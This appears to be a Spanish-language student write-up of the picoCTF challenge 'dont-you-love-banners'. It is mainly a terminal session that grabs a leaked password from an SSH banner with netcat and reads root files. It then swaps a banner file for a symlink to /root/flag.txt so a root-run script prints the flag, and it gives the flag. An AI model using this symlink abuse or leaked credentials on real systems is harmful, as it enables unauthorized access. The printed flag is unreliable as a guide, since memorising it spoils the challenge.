## Descripción

[](https://github.com/neylar-11/notas-hacking-EneJun26/blob/main/picoCTF/Examen1/General%20Skills/6%20-%20dont-you-love-banners.md#descripci%C3%B3n)

Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 65071`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 59124`. From the above information abuse the machine and find the flag in the /root directory.

## Solución

[](https://github.com/neylar-11/notas-hacking-EneJun26/blob/main/picoCTF/Examen1/General%20Skills/6%20-%20dont-you-love-banners.md#soluci%C3%B3n)

### Solucion

[](https://github.com/neylar-11/notas-hacking-EneJun26/blob/main/picoCTF/Examen1/General%20Skills/6%20-%20dont-you-love-banners.md#solucion)

1erphreaking: [https://www.google.com/search?q=primer+phreaking&oq=primer+phreaking&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRigATIHCAIQIRigATIHCAMQIRiPAjIHCAQQIRiPAtIBCTE2MzE5ajBqN6gCALACAA&sourceid=chrome&ie=UTF-8](https://www.google.com/search?q=primer+phreaking&oq=primer+phreaking&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRigATIHCAIQIRigATIHCAMQIRiPAjIHCAQQIRiPAtIBCTE2MzE5ajBqN6gCALACAA&sourceid=chrome&ie=UTF-8)

```
┌──(kali㉿kali)-[~]
└─$ cd picoctf    


┌──(kali㉿kali)-[~/picoctf]
└─$ cd examen1

┌──(kali㉿kali)-[~/picoctf/examen1]
└─$ mkdir dont-you-love-banners

  
┌──(kali㉿kali)-[~/picoctf/examen1]
└─$ cd dont-you-love-banners

┌──(kali㉿kali)-[~/picoctf/examen1/dont-you-love-banners]
└─$ nc tethys.picoctf.net 65071
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C

┌──(kali㉿kali)-[~/picoctf/examen1/dont-you-love-banners]
└─$ nc tethys.picoctf.net 59124
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
Jhon Draper
Lol, good try, try again and good luck

What is the top cyber security conference in the world?
DefCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ ls -al /root
ls -al /root
total 16
drwxr-xr-x 1 root root    6 Mar 12  2024 .
drwxr-xr-x 1 root root   29 Mar 11 02:36 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ^C

┌──(kali㉿kali)-[~/picoctf/examen1/dont-you-love-banners]
└─$ nc tethys.picoctf.net 59124                        
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

what is the password? 


```

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

## Notas

[](https://github.com/neylar-11/notas-hacking-EneJun26/blob/main/picoCTF/Examen1/General%20Skills/6%20-%20dont-you-love-banners.md#notas)

- **Netcat** (comando `nc`) es una herramienta de red que sirve para **abrir conexiones TCP o UDP desde la terminal**.

## Referencias